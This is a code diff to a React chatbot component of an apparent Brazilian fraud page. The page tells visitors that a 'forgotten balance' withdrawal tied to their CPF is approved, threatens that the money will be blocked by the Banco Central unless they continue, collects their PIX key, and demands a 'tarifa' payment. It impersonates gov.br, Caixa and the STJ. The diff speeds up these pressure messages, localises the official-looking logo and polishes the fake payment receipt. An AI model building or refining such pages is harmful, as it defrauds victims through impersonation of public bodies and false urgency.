@@ -95,24 +95,24 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         setTyping(false);
         addBotMessage(`Parabéns, ${name}! A sua solicitação de saque foi aprovada no valor de ${formattedVal} referentes a saldos esquecidos no CPF ${data.docValue}.`, undefined, "/assets/banners/banner_saque_aprovado.png");
         
-        // Show second message after 2 seconds
+        // Show second message faster
         setTimeout(() => {
           setTyping(true);
           setTimeout(() => {
             setTyping(false);
             addBotMessage(`ATENÇÃO: Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber este valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central. Caso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos. Observação: Isso só acontecerá se você não concluir a etapa a seguir.`, undefined, "/assets/banners/banner_atencao.png");
             
-            // Show third message after 2 seconds
+            // Show third message faster
             setTimeout(() => {
               setTyping(true);
               setTimeout(() => {
                 setTyping(false);
                 addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua Chave PIX de preferência:`, undefined, "/assets/banners/banner_pix.png");
                 setAwaitingPix(true);
-              }, 1500);
-            }, 2000);
-          }, 1500);
-        }, 2000);
+              }, 800);
+            }, 1000);
+          }, 800);
+        }, 1000);
       } catch (e) {
         setTyping(false);
         addBotMessage("Poxa, deu uma falha de conexão. Tenta recarregar a página, tá bom?");
@@ -166,7 +166,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
             setTyping(false);
             addBotMessage("Eu não consegui identificar isso como uma chave PIX válida. Digite corretamente a sua Chave PIX:");
             setAwaitingPix(true);
-         }, 1000);
+         }, 500);
          return;
       }
 
@@ -181,7 +181,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         addBotMessage(`Parabéns, **${leadName}**!\n\nA sua **solicitação de saque foi aprovada** para a Chave Pix cadastrada:\n**Chave Pix:** ${pix}\n\nClique no botão abaixo para efetuar a **transferência do valor de ${leadValue}** para a conta da Chave Pix cadastrada.`, [
           { text: "Efetuar saque", action: "confirm_saque_1" }
         ]);
-      }, 1500);
+      }, 800);
     }
     else if (action === "confirm_saque_1") {
       setMessages(prev => {
@@ -196,7 +196,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         addBotMessage(`**ATENÇÃO:** Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber este valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central.\n\nCaso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos.\n\n**Observação:** Isso só acontecerá se você não concluir a etapa a seguir.`, [
           { text: "Efetuar Saque", action: "generate_payment" }
         ]);
-      }, 1500);
+      }, 800);
     }
     else if (action === "generate_payment") {
       setMessages(prev => {
@@ -269,7 +269,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
             >
               {msg.sender === 'bot' && (
                 <div className="w-10 h-10 rounded-full flex-shrink-0 bg-[#005CA9] flex items-center justify-center overflow-hidden shadow-sm mt-1 border-2 border-[#161c24]">
-                  <img src="/assets/banners/bot_avatar.png" onError={(e) => { e.currentTarget.src = 'https://i.imgur.com/rB0rJ44.png' }} alt="Bot" className="w-full h-full object-contain p-1" />
+                  <img src="/assets/banners/bot_avatar.png" onError={(e) => { e.currentTarget.src = '/assets/logos/asset_m_brand.png' }} alt="Bot" className="w-full h-full object-contain p-1" />
                 </div>
               )}
 
@@ -408,7 +408,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
           {typing && (
              <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex justify-start items-start gap-3">
                <div className="w-10 h-10 rounded-full flex-shrink-0 bg-[#005CA9] flex items-center justify-center overflow-hidden shadow-sm mt-1 border-2 border-[#161c24]">
-                 <img src="https://i.imgur.com/rB0rJ44.png" alt="gov.br" className="w-full h-full object-contain p-1" />
+                 <img src="/assets/logos/asset_m_brand.png" alt="gov.br" className="w-full h-full object-contain p-1" />
                </div>
                <div className="bg-[#1e2732] p-4 rounded-2xl rounded-tl-sm shadow-sm flex items-center space-x-2">
                   <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" />
@@ -437,57 +437,54 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
                    <div className="absolute inset-0 opacity-10 bg-[linear-gradient(45deg,transparent_45%,white_45%,white_55%,transparent_55%)] bg-[length:20px_20px]"></div>
                 </div>
 
-                <div className="bg-white px-6 py-5 rounded-t-2xl -mt-3 relative z-20 shadow-[0_-4px_10px_rgba(0,0,0,0.05)]">
+                <div className="bg-white px-6 py-5 relative z-20 shadow-[0_-4px_10px_rgba(0,0,0,0.05)]">
                   {/* Valores e Data Header */}
-                  <div className="flex justify-between items-start mb-6">
-                    <div>
-                      <p className="text-[13px] text-gray-500 font-medium mb-1">Valor</p>
+                  <div className="flex justify-between items-center mb-6 text-center">
+                    <div className="flex-1">
+                      <p className="text-[13px] text-gray-600 font-medium mb-1">Valor</p>
                       <p className="text-[#005CA9] font-extrabold text-2xl">{leadValue}</p>
                     </div>
-                    <div className="w-px bg-gray-200 h-10 mx-2"></div>
-                    <div className="text-right">
-                      <p className="text-[13px] text-gray-500 font-medium mb-1">Data</p>
-                      <p className="text-[#005CA9] font-bold text-[15px]">{new Date().toLocaleDateString('pt-BR')}</p>
-                      <p className="text-[#005CA9] text-xs">{new Date().toLocaleTimeString('pt-BR')}</p>
+                    <div className="w-px bg-gray-300 h-16 mx-2"></div>
+                    <div className="flex-1">
+                      <p className="text-[13px] text-gray-600 font-medium mb-1">Data</p>
+                      <p className="text-[#005CA9] font-bold text-[17px]">{new Date().toLocaleDateString('pt-BR')}</p>
+                      <p className="text-[#005CA9] text-[13px]">{new Date().toLocaleTimeString('pt-BR')}</p>
                     </div>
                   </div>
 
                   {/* Dados do Recebedor */}
-                  <div className="border-t-2 border-[#005CA9] pt-3 mb-6">
-                    <h3 className="text-[#005CA9] font-bold text-[15px] mb-4">Dados do recebedor</h3>
-                    <div className="space-y-4">
+                  <div className="mb-6">
+                    <h3 className="text-[#005CA9] font-bold text-[17px] mb-2">Dados do recebedor</h3>
+                    <div className="border-b-[1.5px] border-[#005CA9] mb-4"></div>
+                    <div className="space-y-3">
                       <div>
-                        <p className="text-sm text-gray-500">Nome</p>
-                        <p className="text-base font-bold text-gray-800 uppercase">{leadName}</p>
+                        <p className="text-[15px] text-gray-600">Nome</p>
+                        <p className="text-[17px] font-black text-[#4b5563] uppercase">{leadName}</p>
                       </div>
                       <div>
-                        <p className="text-sm text-gray-500">CPF</p>
-                        <p className="text-base font-bold text-gray-800">***.{data.docValue.substring(3,6)}.{data.docValue.substring(7,10)}-**</p>
+                        <p className="text-[15px] text-gray-600">CPF</p>
+                        <p className="text-[17px] font-black text-[#4b5563]">***.{data.docValue.substring(3,6)}.{data.docValue.substring(7,10)}-**</p>
                       </div>
                       <div>
-                        <p className="text-sm text-gray-500">Instituição</p>
-                        <p className="text-base font-bold text-gray-800">CAIXA ECONÔMICA FEDERAL</p>
+                        <p className="text-[15px] text-gray-600">Instituição</p>
+                        <p className="text-[17px] font-black text-[#4b5563]">CAIXA ECONÔMICA FEDERAL</p>
                       </div>
                     </div>
                   </div>
 
                   {/* Dados do Pagador */}
-                  <div className="border-t-2 border-[#005CA9] pt-3 relative">
-                    <h3 className="text-[#005CA9] font-bold text-[15px] mb-4">Dados do pagador</h3>
-                    <div className="space-y-4">
+                  <div className="relative">
+                    <h3 className="text-[#005CA9] font-bold text-[17px] mb-2">Dados do pagador</h3>
+                    <div className="border-b-[1.5px] border-[#005CA9] mb-4"></div>
+                    <div className="space-y-3">
                       <div>
-                        <p className="text-sm text-gray-500">Nome</p>
-                        <p className="text-base font-bold text-gray-800 uppercase">SUPERIOR TRIBUNAL DE JUSTIÇA - STJ</p>
+                        <p className="text-[15px] text-gray-600">Nome</p>
+                        <p className="text-[17px] font-black text-[#4b5563] uppercase">SUPERIOR TRIBUNAL DE JUSTIÇA - STJ</p>
                       </div>
                       <div>
-                        <p className="text-sm text-gray-500">CNPJ</p>
-                        <p className="text-base font-bold text-gray-800">**.043.145/0001-**</p>
+                        <p className="text-[15px] text-gray-600">CNPJ</p>
+                        <p className="text-[17px] font-black text-[#4b5563]">**.043.145/0001-**</p>
                       </div>
-                    </div>
-                    
-                    {/* Share Button */}
-                    <div className="absolute bottom-0 right-0 w-12 h-12 bg-white rounded-full shadow-[0_3px_10px_rgba(0,0,0,0.1)] flex items-center justify-center border border-gray-100 cursor-pointer">
-                      <svg className="w-5 h-5 text-orange-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8.684 13.342C8.886 12.938 9 12.482 9 12c0-.482-.114-.938-.316-1.342m0 2.684a3 3 0 110-2.684m0 2.684l6.632 3.316m-6.632-6l6.632-3.316m0 0a3 3 0 105.367-2.684 3 3 0 00-5.367 2.684zm0 9.316a3 3 0 105.368 2.684 3 3 0 00-5.368-2.684z" /></svg>
                     </div>
                   </div>
                 </div>
@@ -502,7 +499,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
               <div className="w-full max-w-sm mx-auto bg-[#004e98] rounded-xl overflow-hidden shadow-2xl pb-12 font-sans">
                 {/* Header Instruções */}
                 <div className="bg-white text-center py-8 px-4 rounded-b-[40px] mb-10 shadow-lg relative z-20">
-                   <img src="https://i.imgur.com/rB0rJ44.png" alt="gov.br" className="h-8 mx-auto mb-4" />
+                   <img src="/assets/logos/asset_m_brand.png" alt="gov.br" className="h-8 mx-auto mb-4" />
                    <h2 className="text-[#004e98] font-extrabold text-xl leading-tight">COMO REALIZAR O<br/>PAGAMENTO DA TARIFA?</h2>
                    <p className="text-gray-500 text-xs mt-3 flex items-center justify-center gap-1">
                      <AlertCircle className="w-3 h-3" /> É necessário o pagamento para a liberação
@@ -522,7 +519,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
                       <div className="bg-gray-800 p-2 rounded-t-xl w-[260px] h-[160px] flex items-center justify-center shadow-lg relative z-10 border-b-4 border-gray-900">
                         {/* Tela do Laptop */}
                         <div className="bg-white w-full h-full rounded-sm flex flex-col items-center justify-start pt-3 relative overflow-hidden">
-                           <img src="https://i.imgur.com/rB0rJ44.png" alt="gov.br" className="h-4 mb-2" />
+                           <img src="/assets/logos/asset_m_brand.png" alt="gov.br" className="h-4 mb-2" />
                            <p className="text-[10px] text-gray-500 font-bold mb-1">CÓDIGO PIX DA TARIFA</p>
                            <p className="text-[#004e98] font-bold text-sm mb-2">R$ {tarifa.toFixed(2)}</p>
                            
@@ -591,7 +588,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
                       <div className="flex flex-col items-center absolute left-4 bottom-0">
                         <div className="bg-gray-800 p-2 rounded-t-lg w-[200px] h-[130px] flex items-center justify-center shadow-lg border-b-2 border-gray-900">
                           <div className="bg-white w-full h-full rounded-sm flex flex-col items-center justify-center p-2 relative overflow-hidden">
-                             <img src="https://i.imgur.com/rB0rJ44.png" alt="gov.br" className="h-3 mb-2" />
+                             <img src="/assets/logos/asset_m_brand.png" alt="gov.br" className="h-3 mb-2" />
                              <p className="text-[#004e98] font-bold text-xs">Segurança</p>
                              <p className="text-green-500 text-[8px] font-bold mt-1">✓ Pagamento Confirmado</p>
                           </div>
